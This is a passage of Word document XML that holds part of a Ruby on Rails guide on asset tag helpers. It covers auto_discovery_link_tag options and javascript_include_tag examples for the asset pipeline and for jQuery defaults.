          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rel</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> value in the link. The default value is “alternate”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="610CF958" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="72"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:type</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> specifies an explicit </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>MIME</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> type. Rails will generate an appropriate </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>MIME</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> type automatically.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49C68F37" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="72"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:title</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> specifies the title of the link. The default value is the uppercased </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:type</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> value, for example, “</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>ATOM</w:t>
      </w:r>
      <w:r>
        <w:t>” or “</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>RSS</w:t>
      </w:r>
      <w:r>
        <w:t>”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6171208C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">3.1.2 Linking to JavaScript Files with the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>javascript_include_tag</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BFA8675" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>javascript_include_tag</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> helper returns an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>script</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> tag for each source provided.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65050A0C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you are using Rails with the </w:t>
      </w:r>
      <w:hyperlink r:id="rId289" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Asset Pipeline</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> enabled, this helper will generate a link to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>/assets/javascripts/</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> rather than </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>public/javascripts</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which was used in earlier versions of Rails. This link is then served by the Sprockets gem, which was introduced in Rails 3.1.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D5F5C82" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A JavaScript file within a Rails application or Rails engine goes in one of three locations: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app/assets</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>lib/assets</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>vendor/assets</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. These locations are explained in detail in the </w:t>
      </w:r>
      <w:hyperlink r:id="rId290" w:anchor="asset-organization" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Asset Organization section in the Asset Pipeline Guide</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1E6C9B27" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can specify a full path relative to the document root, or a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, if you prefer. For example, to link to a JavaScript file that is inside a directory called </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>javascripts</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> inside of one of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app/assets</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>lib/assets</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>vendor/assets</w:t>
      </w:r>
      <w:r>
        <w:t>, you would do this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4175"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="6D43638B" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4788FC49" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="348067666"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>javascript_include_tag "main"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4D4EC255" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Rails will then output a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>script</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> tag such as this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7295"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="5646AED3" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="61821403" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1571113324"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;script</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>src='/assets/main.js'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>type="text/javascript"&gt;&lt;/script&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="70ADB887" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The request to this asset is then served by the Sprockets gem.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="538D181D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To include multiple files such as </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app/assets/javascripts/main.js</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app/assets/javascripts/columns.js</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> at the same time:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5495"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="2DB00F3C" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="66E30126" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1075736059"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>javascript_include_tag "main", "columns"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="56453102" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To include </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app/assets/javascripts/main.js</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>app/assets/javascripts/photos/columns.js</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6455"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="46E2073F" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="37760D1E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="390271813"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>javascript_include_tag "main", "/photos/columns"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="683CE36F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To include </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>http://example.com/main.js</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6116"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="037E5FE9" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="02EE1A94" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="657535565"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>javascript_include_tag "</w:t>
            </w:r>
            <w:hyperlink r:id="rId291" w:history="1">
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://example.com/main.js</w:t>
              </w:r>
            </w:hyperlink>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="22320D58" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If the application does not use the asset pipeline, the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:defaults</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option loads jQuery by default:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4535"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="4D9A5A67" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7536AD11" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="2050950911"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>javascript_include_tag :defaults</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="358AEEF8" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Outputting </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>script</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> tags such as this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8306"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="08B252A4" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2DFE79DC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;script</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>src="/javascripts/jquery.js"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>type="text/javascript"&gt;&lt;/script&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1695B7A1" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;script</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>src="/javascripts/jquery_ujs.js"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>type="text/javascript"&gt;&lt;/script&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3C190511" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">These two files for jQuery, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>jquery.js</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>jquery_ujs.js</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> must be placed inside </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>public/javascripts</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> if the application doesn’t use the asset pipeline. These files can be downloaded from the </w:t>
      </w:r>
      <w:hyperlink r:id="rId292" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>jquery-rails repository on GitHub</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="26E42C74" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you are using the asset pipeline, this tag will render a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>script</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> tag for an asset called </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>defaults.js</w:t>
      </w:r>
      <w:r>
        <w:t>, which would not exist in your application unless you’ve explicitly created it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A8A185D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">And you can in any case override the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:defaults</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> expansion in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config/application.rb</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AC12D4" w14:paraId="1AE14217" w14:textId="77777777" w:rsidTr="00AC12D4">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3ED5606E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1213226995"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
